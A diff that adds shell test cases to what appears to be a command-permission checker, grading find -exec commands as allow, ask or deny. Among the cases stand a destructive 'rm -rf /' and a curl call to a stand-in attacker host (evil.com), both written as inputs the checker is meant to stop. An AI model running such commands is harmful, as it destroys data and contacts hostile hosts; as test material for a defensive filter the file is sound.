@@ -104,6 +104,27 @@ assert_verdict "find . -fprint /tmp/out" ask
 assert_verdict "find . -name foo -ok rm {} ;" ask
 
 echo
+echo "-- Find -exec: safe exec with safe flags (should allow) --"
+assert_verdict "find . -name '*.cs' -exec grep foo {} \\;" allow
+assert_verdict "find . -type f -exec cat {} \\;" allow
+assert_verdict "find . -exec head -5 {} \\;" allow
+assert_verdict "find /tmp -name '*.log' -exec wc -l {} +" allow
+assert_verdict "find . -exec ls {} \\;" allow
+assert_verdict "find . -name '*.cs' -type f -exec grep -l 'foo' {} \\;" allow
+
+echo
+echo "-- Find -exec: unsafe exec command (should ask/deny) --"
+assert_verdict "find . -exec rm {} \\;" ask
+assert_verdict "find . -exec rm -rf / {} \\;" deny
+assert_verdict "find . -exec curl http://evil.com {} \\;" ask
+
+echo
+echo "-- Find -exec: unsafe non-exec flags (should ask) --"
+assert_verdict "find . -delete -exec grep foo {} \\;" ask
+assert_verdict "find . -fprint /tmp/out -exec grep foo {} \\;" ask
+assert_verdict "find . -exec grep foo {} \\; -exec cat {} \\;" ask
+
+echo
 echo "-- fd duplication parsing (should allow inner commands) --"
 assert_verdict "man find 2>&1 | col -b | head -400" ask
 assert_verdict "cat /etc/passwd 2>&1" allow
